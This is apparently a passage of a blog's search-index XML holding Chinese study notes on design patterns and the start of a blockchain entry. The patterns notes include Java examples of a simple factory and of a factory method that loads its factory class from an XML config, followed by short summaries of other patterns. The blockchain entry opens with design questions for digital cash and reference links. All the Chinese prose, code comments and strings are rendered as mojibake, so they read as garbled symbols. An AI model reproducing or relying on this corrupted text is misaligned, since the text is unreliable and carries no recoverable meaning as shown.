<li>ç®€å•å·¥å‚æ¨¡å¼çš„å·¥å‚ç±»å•ä¸€ï¼Œè´Ÿè´£æ‰€æœ‰äº§å“çš„åˆ›å»ºï¼ŒèŒè´£è¿‡é‡ï¼Œä¸€æ—¦å¼‚å¸¸ï¼Œæ•´ä¸ªç³»ç»Ÿå°†å—å½±å“ã€‚ä¸”å·¥å‚ç±»ä»£ç ä¼šéå¸¸è‡ƒè‚¿ï¼Œè¿èƒŒé«˜èšåˆåŸåˆ™ã€‚</li>
<li>ä½¿ç”¨ç®€å•å·¥å‚æ¨¡å¼ä¼šå¢åŠ ç³»ç»Ÿä¸­ç±»çš„ä¸ªæ•°ï¼ˆå¼•å…¥æ–°çš„å·¥å‚ç±»ï¼‰ï¼Œå¢åŠ ç³»ç»Ÿçš„å¤æ‚åº¦å’Œç†è§£éš¾åº¦</li>
<li>ç³»ç»Ÿæ‰©å±•å›°éš¾ï¼Œä¸€æ—¦å¢åŠ æ–°äº§å“ä¸å¾—ä¸ä¿®æ”¹å·¥å‚é€»è¾‘ï¼Œåœ¨äº§å“ç±»å‹è¾ƒå¤šæ—¶ï¼Œå¯èƒ½é€ æˆé€»è¾‘è¿‡äºå¤æ‚</li>
<li>ç®€å•å·¥å‚æ¨¡å¼ä½¿ç”¨äº† static å·¥å‚æ–¹æ³•ï¼Œé€ æˆå·¥å‚è§’è‰²æ— æ³•å½¢æˆåŸºäºç»§æ‰¿çš„ç­‰çº§ç»“æ„ã€‚</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æŠ½è±¡äº§å“</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å…·ä½“äº§å“ï¼šProductA</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ConcreteProduct1</span> <span class="keyword">implements</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;å…·ä½“äº§å“1æ˜¾ç¤º...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å…·ä½“äº§å“ï¼šProductB</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ConcreteProduct2</span> <span class="keyword">implements</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;å…·ä½“äº§å“2æ˜¾ç¤º...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Const</span> &#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PRODUCT_A</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PRODUCT_B</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PRODUCT_C</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SimpleFactory</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Product <span class="title function_">makeProduct</span><span class="params">(<span class="type">int</span> kind)</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (kind) &#123;</span><br><span class="line">                <span class="keyword">case</span> Const.PRODUCT_A:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct1</span>();</span><br><span class="line">                <span class="keyword">case</span> Const.PRODUCT_B:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct2</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å·¥å‚æ–¹æ³•æ¨¡å¼"><a href="#å·¥å‚æ–¹æ³•æ¨¡å¼" class="headerlink" title="å·¥å‚æ–¹æ³•æ¨¡å¼"></a>å·¥å‚æ–¹æ³•æ¨¡å¼</h3><p>â€œå·¥å‚æ–¹æ³•æ¨¡å¼â€æ˜¯å¯¹ç®€å•å·¥å‚æ¨¡å¼çš„è¿›ä¸€æ­¥æŠ½è±¡åŒ–ï¼Œå…¶å¥½å¤„æ˜¯å¯ä»¥ä½¿ç³»ç»Ÿåœ¨ä¸ä¿®æ”¹åŸæ¥ä»£ç çš„æƒ…å†µä¸‹å¼•è¿›æ–°çš„äº§å“ï¼Œå³æ»¡è¶³å¼€é—­åŸåˆ™ã€‚</p>
<p>æ»¡è¶³é‡Œæ°æ›¿æ¢åŸåˆ™, è¿ªç±³ç‰¹æ³•åˆ™,ä¾èµ–å€’ç½®åŸåˆ™</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FactoryMethod;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AbstractFactoryTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Product a;</span><br><span class="line">            AbstractFactory af;</span><br><span class="line">            af = (AbstractFactory) ReadXML1.getObject();</span><br><span class="line">            a = af.newProduct();</span><br><span class="line">            a.show();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æŠ½è±¡äº§å“ï¼šæä¾›äº†äº§å“çš„æ¥å£</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å…·ä½“äº§å“1ï¼šå®ç°æŠ½è±¡äº§å“ä¸­çš„æŠ½è±¡æ–¹æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteProduct1</span> <span class="keyword">implements</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å…·ä½“äº§å“1æ˜¾ç¤º...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å…·ä½“äº§å“2ï¼šå®ç°æŠ½è±¡äº§å“ä¸­çš„æŠ½è±¡æ–¹æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteProduct2</span> <span class="keyword">implements</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å…·ä½“äº§å“2æ˜¾ç¤º...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æŠ½è±¡å·¥å‚ï¼šæä¾›äº†å‚å“çš„ç”Ÿæˆæ–¹æ³•</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">AbstractFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">newProduct</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å…·ä½“å·¥å‚1ï¼šå®ç°äº†å‚å“çš„ç”Ÿæˆæ–¹æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteFactory1</span> <span class="keyword">implements</span> <span class="title class_">AbstractFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">newProduct</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å…·ä½“å·¥å‚1ç”Ÿæˆ--&gt;å…·ä½“äº§å“1...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å…·ä½“å·¥å‚2ï¼šå®ç°äº†å‚å“çš„ç”Ÿæˆæ–¹æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteFactory2</span> <span class="keyword">implements</span> <span class="title class_">AbstractFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">newProduct</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å…·ä½“å·¥å‚2ç”Ÿæˆ--&gt;å…·ä½“äº§å“2...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FactoryMethod;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.*;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReadXML1</span> &#123;</span><br><span class="line">    <span class="comment">//è¯¥æ–¹æ³•ç”¨äºä»XMLé…ç½®æ–‡ä»¶ä¸­æå–å…·ä½“ç±»ç±»åï¼Œå¹¶è¿”å›ä¸€ä¸ªå®ä¾‹å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//åˆ›å»ºæ–‡æ¡£å¯¹è±¡</span></span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">dFactory</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">            <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dFactory.newDocumentBuilder();</span><br><span class="line">            Document doc;</span><br><span class="line">            doc = builder.parse(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src/FactoryMethod/config1.xml&quot;</span>));</span><br><span class="line">            <span class="comment">//è·å–åŒ…å«ç±»åçš„æ–‡æœ¬èŠ‚ç‚¹</span></span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">nl</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">            <span class="type">Node</span> <span class="variable">classNode</span> <span class="operator">=</span> nl.item(<span class="number">0</span>).getFirstChild();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cName</span> <span class="operator">=</span> <span class="string">&quot;FactoryMethod.&quot;</span> + classNode.getNodeValue();</span><br><span class="line">            <span class="comment">//System.out.println(&quot;æ–°ç±»åï¼š&quot;+cName);</span></span><br><span class="line">            <span class="comment">//é€šè¿‡ç±»åç”Ÿæˆå®ä¾‹å¯¹è±¡å¹¶å°†å…¶è¿”å›</span></span><br><span class="line">            Class&lt;?&gt; c = Class.forName(cName);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æŠ½è±¡å·¥å‚æ¨¡å¼"><a href="#æŠ½è±¡å·¥å‚æ¨¡å¼" class="headerlink" title="æŠ½è±¡å·¥å‚æ¨¡å¼"></a>æŠ½è±¡å·¥å‚æ¨¡å¼</h3><p>æŠ½è±¡å·¥å‚æ¨¡å¼æ˜¯å·¥å‚æ–¹æ³•æ¨¡å¼çš„å‡çº§ç‰ˆæœ¬ï¼Œå·¥å‚æ–¹æ³•æ¨¡å¼åªç”Ÿäº§ä¸€ä¸ªç­‰çº§çš„äº§å“ï¼Œè€ŒæŠ½è±¡å·¥å‚æ¨¡å¼å¯ç”Ÿäº§å¤šä¸ªç­‰çº§çš„äº§å“ã€‚</p>
<h2 id="å»ºé€ è€…æ¨¡å¼-Builder-Pattern"><a href="#å»ºé€ è€…æ¨¡å¼-Builder-Pattern" class="headerlink" title="å»ºé€ è€…æ¨¡å¼(Builder Pattern)"></a>å»ºé€ è€…æ¨¡å¼(Builder Pattern)</h2><p>ç”¨æ¥åˆ›å»ºå¤æ‚çš„å¤åˆå¯¹è±¡</p>
<h2 id="ä»£ç†æ¨¡å¼-Proxy-Pattern"><a href="#ä»£ç†æ¨¡å¼-Proxy-Pattern" class="headerlink" title="ä»£ç†æ¨¡å¼(Proxy Pattern)"></a>ä»£ç†æ¨¡å¼(Proxy Pattern)</h2><p>ä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ç§ä»£ç†ä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—®</p>
<h2 id="å¤–è§‚æ¨¡å¼-Facade-Pattern"><a href="#å¤–è§‚æ¨¡å¼-Facade-Pattern" class="headerlink" title="å¤–è§‚æ¨¡å¼(Facade Pattern)"></a>å¤–è§‚æ¨¡å¼(Facade Pattern)</h2><p>å¯¹å¤–æä¾›ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£ç”¨æ¥è®¿é—®å­ç³»ç»Ÿ</p>
<h2 id="è£…é¥°å™¨æ¨¡å¼ï¼ˆDecorator-Patternï¼‰"><a href="#è£…é¥°å™¨æ¨¡å¼ï¼ˆDecorator-Patternï¼‰" class="headerlink" title="è£…é¥°å™¨æ¨¡å¼ï¼ˆDecorator Patternï¼‰"></a>è£…é¥°å™¨æ¨¡å¼ï¼ˆDecorator Patternï¼‰</h2><p>ä¸ºå¯¹è±¡æ·»åŠ æ–°åŠŸèƒ½</p>
<h2 id="äº«å…ƒæ¨¡å¼ï¼ˆFlyweight-Patternï¼‰"><a href="#äº«å…ƒæ¨¡å¼ï¼ˆFlyweight-Patternï¼‰" class="headerlink" title="äº«å…ƒæ¨¡å¼ï¼ˆFlyweight Patternï¼‰"></a>äº«å…ƒæ¨¡å¼ï¼ˆFlyweight Patternï¼‰</h2><p>ä½¿ç”¨å¯¹è±¡æ± æ¥å‡å°‘é‡å¤å¯¹è±¡çš„åˆ›å»º</p>
<h2 id="ç»„åˆæ¨¡å¼ï¼ˆComposite-Patternï¼‰"><a href="#ç»„åˆæ¨¡å¼ï¼ˆComposite-Patternï¼‰" class="headerlink" title="ç»„åˆæ¨¡å¼ï¼ˆComposite Patternï¼‰"></a>ç»„åˆæ¨¡å¼ï¼ˆComposite Patternï¼‰</h2><p>å°†æ•´ä½“ä¸å±€éƒ¨ï¼ˆæ ‘å½¢ç»“æ„ï¼‰è¿›è¡Œé€’å½’ç»„åˆï¼Œè®©å®¢æˆ·ç«¯èƒ½å¤Ÿä»¥ä¸€ç§çš„æ–¹å¼å¯¹å…¶è¿›è¡Œå¤„ç†</p>
<h2 id="é€‚é…å™¨æ¨¡å¼ï¼ˆAdapter-Patternï¼‰"><a href="#é€‚é…å™¨æ¨¡å¼ï¼ˆAdapter-Patternï¼‰" class="headerlink" title="é€‚é…å™¨æ¨¡å¼ï¼ˆAdapter Patternï¼‰"></a>é€‚é…å™¨æ¨¡å¼ï¼ˆAdapter Patternï¼‰</h2><p>å°†åŸæ¥ä¸å…¼å®¹çš„ä¸¤ä¸ªç±»èåˆåœ¨ä¸€èµ·</p>
<h2 id="æ¡¥æ¥æ¨¡å¼ï¼ˆBridge-Patternï¼‰"><a href="#æ¡¥æ¥æ¨¡å¼ï¼ˆBridge-Patternï¼‰" class="headerlink" title="æ¡¥æ¥æ¨¡å¼ï¼ˆBridge Patternï¼‰"></a>æ¡¥æ¥æ¨¡å¼ï¼ˆBridge Patternï¼‰</h2><p>å°†ä¸¤ä¸ªèƒ½å¤Ÿç‹¬ç«‹å˜åŒ–çš„éƒ¨åˆ†åˆ†ç¦»å¼€æ¥</p>
<h2 id="æ¨¡æ¿æ¨¡å¼ï¼ˆTemplate-Patternï¼‰"><a href="#æ¨¡æ¿æ¨¡å¼ï¼ˆTemplate-Patternï¼‰" class="headerlink" title="æ¨¡æ¿æ¨¡å¼ï¼ˆTemplate Patternï¼‰"></a>æ¨¡æ¿æ¨¡å¼ï¼ˆTemplate Patternï¼‰</h2><p>å®šä¹‰ä¸€å¥—æµç¨‹æ¨¡æ¿ï¼Œæ ¹æ®éœ€è¦å®ç°æ¨¡æ¿ä¸­çš„æ“ä½œ</p>
<h2 id="ç­–ç•¥æ¨¡å¼ï¼ˆStrategy-Patternï¼‰"><a href="#ç­–ç•¥æ¨¡å¼ï¼ˆStrategy-Patternï¼‰" class="headerlink" title="ç­–ç•¥æ¨¡å¼ï¼ˆStrategy Patternï¼‰"></a>ç­–ç•¥æ¨¡å¼ï¼ˆStrategy Patternï¼‰</h2><p>å°è£…ä¸åŒçš„ç®—æ³•ï¼Œç®—æ³•ä¹‹é—´èƒ½äº’ç›¸æ›¿æ¢</p>
<h2 id="è´£ä»»é“¾æ¨¡å¼ï¼ˆChain-of-Responsibility-Patternï¼‰"><a href="#è´£ä»»é“¾æ¨¡å¼ï¼ˆChain-of-Responsibility-Patternï¼‰" class="headerlink" title="è´£ä»»é“¾æ¨¡å¼ï¼ˆChain of Responsibility Patternï¼‰"></a>è´£ä»»é“¾æ¨¡å¼ï¼ˆChain of Responsibility Patternï¼‰</h2><p>æ‹¦æˆªçš„ç±»éƒ½å®ç°ç»Ÿä¸€æ¥å£ï¼Œæ¯ä¸ªæ¥æ”¶è€…éƒ½åŒ…å«å¯¹ä¸‹ä¸€ä¸ªæ¥æ”¶è€…çš„å¼•ç”¨ã€‚å°†è¿™äº›å¯¹è±¡è¿æ¥æˆä¸€æ¡é“¾ï¼Œå¹¶ä¸”æ²¿ç€è¿™æ¡é“¾ä¼ é€’è¯·æ±‚ï¼Œç›´åˆ°æœ‰å¯¹è±¡å¤„ç†å®ƒä¸ºæ­¢ã€‚</p>
<h2 id="è¿­ä»£å™¨æ¨¡å¼ï¼ˆIterator-Patternï¼‰"><a href="#è¿­ä»£å™¨æ¨¡å¼ï¼ˆIterator-Patternï¼‰" class="headerlink" title="è¿­ä»£å™¨æ¨¡å¼ï¼ˆIterator Patternï¼‰"></a>è¿­ä»£å™¨æ¨¡å¼ï¼ˆIterator Patternï¼‰</h2><p>æä¾›ä¸€ç§æ–¹æ³•é¡ºåºè®¿é—®ä¸€ä¸ªèšåˆå¯¹è±¡ä¸­çš„å„ä¸ªå…ƒç´ </p>
<h2 id="å‘½ä»¤æ¨¡å¼ï¼ˆCommand-Patternï¼‰"><a href="#å‘½ä»¤æ¨¡å¼ï¼ˆCommand-Patternï¼‰" class="headerlink" title="å‘½ä»¤æ¨¡å¼ï¼ˆCommand Patternï¼‰"></a>å‘½ä»¤æ¨¡å¼ï¼ˆCommand Patternï¼‰</h2><p> å°†è¯·æ±‚å°è£…æˆå‘½ä»¤ï¼Œå¹¶è®°å½•ä¸‹æ¥ï¼Œèƒ½å¤Ÿæ’¤é”€ä¸é‡åš</p>
<h2 id="çŠ¶æ€æ¨¡å¼ï¼ˆState-Patternï¼‰"><a href="#çŠ¶æ€æ¨¡å¼ï¼ˆState-Patternï¼‰" class="headerlink" title="çŠ¶æ€æ¨¡å¼ï¼ˆState Patternï¼‰"></a>çŠ¶æ€æ¨¡å¼ï¼ˆState Patternï¼‰</h2><p>æ ¹æ®ä¸åŒçš„çŠ¶æ€åšå‡ºä¸åŒçš„è¡Œä¸º</p>
<h2 id="å¤‡å¿˜å½•æ¨¡å¼ï¼ˆMemento-Patternï¼‰"><a href="#å¤‡å¿˜å½•æ¨¡å¼ï¼ˆMemento-Patternï¼‰" class="headerlink" title="å¤‡å¿˜å½•æ¨¡å¼ï¼ˆMemento Patternï¼‰"></a>å¤‡å¿˜å½•æ¨¡å¼ï¼ˆMemento Patternï¼‰</h2><p>ä¿å­˜å¯¹è±¡çš„çŠ¶æ€ï¼Œåœ¨éœ€è¦æ—¶è¿›è¡Œæ¢å¤</p>
<h2 id="ä¸­ä»‹è€…æ¨¡å¼ï¼ˆMediator-Patternï¼‰"><a href="#ä¸­ä»‹è€…æ¨¡å¼ï¼ˆMediator-Patternï¼‰" class="headerlink" title="ä¸­ä»‹è€…æ¨¡å¼ï¼ˆMediator Patternï¼‰"></a>ä¸­ä»‹è€…æ¨¡å¼ï¼ˆMediator Patternï¼‰</h2><p>å°†å¯¹è±¡ä¹‹é—´çš„é€šä¿¡å…³è”å…³ç³»å°è£…åˆ°ä¸€ä¸ªä¸­ä»‹ç±»ä¸­å•ç‹¬å¤„ç†ï¼Œä»è€Œä½¿å…¶è€¦åˆæ¾æ•£</p>
<h2 id="è§£é‡Šå™¨æ¨¡å¼ï¼ˆInterpreter-Patternï¼‰"><a href="#è§£é‡Šå™¨æ¨¡å¼ï¼ˆInterpreter-Patternï¼‰" class="headerlink" title="è§£é‡Šå™¨æ¨¡å¼ï¼ˆInterpreter Patternï¼‰"></a>è§£é‡Šå™¨æ¨¡å¼ï¼ˆInterpreter Patternï¼‰</h2><p>ç»™å®šä¸€ä¸ªè¯­è¨€ï¼Œå®šä¹‰å®ƒçš„è¯­æ³•è¡¨ç¤ºï¼Œå¹¶å®šä¹‰ä¸€ä¸ªè§£é‡Šå™¨ï¼Œè¿™ä¸ªè§£é‡Šå™¨ä½¿ç”¨è¯¥æ ‡è¯†æ¥è§£é‡Šè¯­è¨€ä¸­çš„å¥å­</p>
<h2 id="è§‚å¯Ÿè€…æ¨¡å¼ï¼ˆObserver-Patternï¼‰"><a href="#è§‚å¯Ÿè€…æ¨¡å¼ï¼ˆObserver-Patternï¼‰" class="headerlink" title="è§‚å¯Ÿè€…æ¨¡å¼ï¼ˆObserver Patternï¼‰"></a>è§‚å¯Ÿè€…æ¨¡å¼ï¼ˆObserver Patternï¼‰</h2><p>çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶é€šçŸ¥è§‚å¯Ÿè€…ï¼Œä¸€å¯¹å¤šçš„å…³ç³»</p>
<h2 id="è®¿é—®è€…æ¨¡å¼ï¼ˆVisitor-Patternï¼‰"><a href="#è®¿é—®è€…æ¨¡å¼ï¼ˆVisitor-Patternï¼‰" class="headerlink" title="è®¿é—®è€…æ¨¡å¼ï¼ˆVisitor Patternï¼‰"></a>è®¿é—®è€…æ¨¡å¼ï¼ˆVisitor Patternï¼‰</h2><p>ç¨³å®šæ•°æ®ç»“æ„ï¼Œå®šä¹‰æ–°çš„æ“ä½œè¡Œä¸º</p>
<h2 id="å§”æ´¾æ¨¡å¼ï¼ˆDelegate-Patternï¼‰"><a href="#å§”æ´¾æ¨¡å¼ï¼ˆDelegate-Patternï¼‰" class="headerlink" title="å§”æ´¾æ¨¡å¼ï¼ˆDelegate Patternï¼‰"></a>å§”æ´¾æ¨¡å¼ï¼ˆDelegate Patternï¼‰</h2><p>å…è®¸å¯¹è±¡ç»„åˆå®ç°ä¸ç»§æ‰¿ç›¸åŒçš„ä»£ç é‡ç”¨ï¼Œè´Ÿè´£ä»»åŠ¡çš„è°ƒç”¨å’Œåˆ†é…</p>
]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>è®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title>åŒºå—é“¾æŠ€æœ¯</title>
    <url>/2021/12/21/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h1 id="åŒºå—é“¾æŠ€æœ¯1-æ¯”ç‰¹å¸å…«å¦"><a href="#åŒºå—é“¾æŠ€æœ¯1-æ¯”ç‰¹å¸å…«å¦" class="headerlink" title="åŒºå—é“¾æŠ€æœ¯1:æ¯”ç‰¹å¸å…«å¦"></a>åŒºå—é“¾æŠ€æœ¯1:æ¯”ç‰¹å¸å…«å¦</h1><ul>
<li>ç†è§£ä¸­æœ¬èªæ¯”ç‰¹å¸ç™½çš®ä¹¦</li>
<li>ç†è§£åˆ†å¸ƒå¼ä¸€è‡´æ€§çš„æ¦‚å¿µ</li>
<li>äº†è§£Paxoså’ŒRaft</li>
<li>ç†è§£ä»¥å¤ªåŠå’Œæ™ºèƒ½åˆçº¦</li>
</ul>
<h2 id="åŒºå—é“¾çš„è´§å¸å±æ€§"><a href="#åŒºå—é“¾çš„è´§å¸å±æ€§" class="headerlink" title="åŒºå—é“¾çš„è´§å¸å±æ€§"></a>åŒºå—é“¾çš„è´§å¸å±æ€§</h2><p>è®¾è®¡ä¸€ç§ç”µå­è´§å¸ï¼Œä½¿å¾—å®ƒèƒ½å¤Ÿåƒç°é‡‘ä¸€æ ·ä½¿ç”¨ï¼Œä»¥åŠä¸ä¾èµ–äºç¬¬ä¸‰æ–¹ç»„ç»‡ã€‚é¦–å…ˆè¦è€ƒè™‘ï¼š</p>
<ol>
<li>å¦‚ä½•ç”Ÿæˆè´§å¸ï¼šè°èƒ½è·å¾—è¿™ä¸ªè´§å¸ï¼Œè·å¾—è´§å¸ä¸èƒ½å¤ªå®¹æ˜“ï¼Œæ­£å¦‚å¿…é¡»å·¥ä½œæ‰èƒ½è·å¾—æŠ¥é…¬ï¼›</li>
<li>å¦‚ä½•å°†è´§å¸ä¸æ‰€æœ‰è€…å…³è”èµ·æ¥ï¼šç°ä¸‹çš„ç¯å¢ƒä¸­ï¼Œä¿¡ç”¨å¡å®ååˆ¶ï¼Œç°é‡‘åŒ¿åï¼›</li>
<li>å¦‚ä½•ä¿æŠ¤äº¤æ˜“åŒæ–¹ï¼šä¿æŠ¤å–å®¶ï¼Œé˜²æ­¢ä¹°å®¶å¯¹æ”¯ä»˜è¿›è¡Œå›æ»šï¼›ä¿æŠ¤ä¹°å®¶ï¼Œå–å®¶å¯¹äº¤æ˜“ä¸èƒ½æŠµèµ–ï¼›</li>
<li>å¦‚ä½•é˜²æ­¢åŒèŠ±ï¼ˆdouble-spendingï¼‰ï¼šå¯¹äºç°é‡‘ä¸å­˜åœ¨åŒé‡æ”¯ä»˜çš„é—®é¢˜ï¼ŒèŠ±å‡ºå»äº†ï¼Œå°±æ²¡æœ‰äº†ï¼›å¦‚æœæ˜¯åŸºäºä¿¡ç”¨çš„ï¼Œæœ‰å¯èƒ½é‡èŠ±ï¼›ç°å®ä¸­ï¼Œäººä»¬ä¸æ˜¯é˜²æ­¢é‡èŠ±è€Œæ˜¯åœ¨æ£€æµ‹å‡ºé‡èŠ±ä¹‹ååŠ ä»¥é‡ç½šã€‚æ•°å­—è´§å¸æ˜¯å®Œå…¨è™šæ‹Ÿçš„è´§å¸ï¼Œä¹Ÿå³ä¸€ä¸²æ•°å­—å°±ä»£è¡¨ä¸€å—å¸ï¼Œè¿™ä¸ªæ•°å­—å¯ä»¥è¢«æ— ç©·æ¬¡çš„åˆ©ç”¨ï¼Œæ€ä¹ˆæ ·èƒ½å¤Ÿé˜²æ­¢åŒèŠ±å‘¢ï¼Ÿ</li>
<li>å¦‚ä½•è®°è´¦ï¼šæ¯ä¸€ç¬”äº¤æ˜“æœ‰æ®å¯æŸ¥ï¼ŒåŒæ—¶ä¿æŠ¤ç”¨æˆ·çš„éšç§ï¼›</li>
</ol>
<p>å‚è€ƒæ–‡çŒ®</p>
<p>ã€1ã€‘<a href="https://link.zhihu.com/?target=https://www.8btc.com/wiki/bitcoin-a-peer-to-peer-electronic-cash-system">æ¯”ç‰¹å¸ç™½çš®ä¹¦ï¼šä¸€ç§ç‚¹å¯¹ç‚¹çš„ç”µå­ç°é‡‘ç³»ç»Ÿ | å·´æ¯”ç‰¹</a></p>
<p>ã€2ã€‘<a href="https://link.zhihu.com/?target=http://book.8btc.com/master_bitcoin">ç²¾é€šæ¯”ç‰¹å¸ | å·´æ¯”ç‰¹å›¾ä¹¦</a></p>
<p>ã€3ã€‘<a href="http://daily.zhihu.com/story/9712661">http://daily.zhihu.com/story/9712661</a></p>
<p>ã€5ã€‘ <a href="https://link.zhihu.com/?target=https://tech.sina.com.cn/csj/2019-03-12/doc-ihrfqzkc3149537.shtml">https://tech.sina.com.cn/csj/2019-03-12/doc-ihrfqzkc3149537.shtml</a></p>
<p>ã€6ã€‘<a href="https://link.zhihu.com/?target=https://www.weiyangx.com/327991.html">https://www.weiyangx.com/327991.html</a></p>
